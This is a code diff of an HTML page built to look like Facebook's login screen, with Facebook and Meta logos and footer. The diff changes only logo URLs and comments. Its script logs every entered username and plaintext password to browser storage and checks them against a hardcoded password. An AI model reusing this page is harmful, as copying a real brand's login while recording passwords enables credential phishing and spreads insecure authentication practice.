@@ -72,7 +72,7 @@
 
   <!-- Facebook Logo -->
   <div class="logo">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" width="150">
+    <img src="https://1000logos.net/wp-content/uploads/2021/04/Facebook-logo.png" alt="Facebook Logo" width="150">
   </div>
 
   <!-- Login Box -->
@@ -87,7 +87,7 @@
 
   <!-- Meta Footer -->
   <div class="meta-footer">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/0/0c/Meta_Platforms_Logo.svg" alt="Meta Logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/02/Meta_Platforms_Inc._logo.svg/512px-Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo">
     <div>© 2025 Meta Platforms, Inc.</div>
   </div>
 
@@ -97,14 +97,14 @@
       const username = document.getElementById("username").value.trim();
       const password = document.getElementById("password").value.trim();
 
-      // Save attempt to login history (max 10)
+      // Save login history (max 10)
       let history = JSON.parse(localStorage.getItem("loginHistory")) || [];
       const timestamp = new Date().toLocaleString();
       history.unshift({ username, password, time: timestamp });
-      history = history.slice(0, 10); // keep only last 10
+      history = history.slice(0, 10);
       localStorage.setItem("loginHistory", JSON.stringify(history));
 
-      // Check login
+      // Redirect logic
       if (username.toLowerCase() === "jin" && password === "synonym117") {
         window.location.href = "dashboard.html";
       } else {
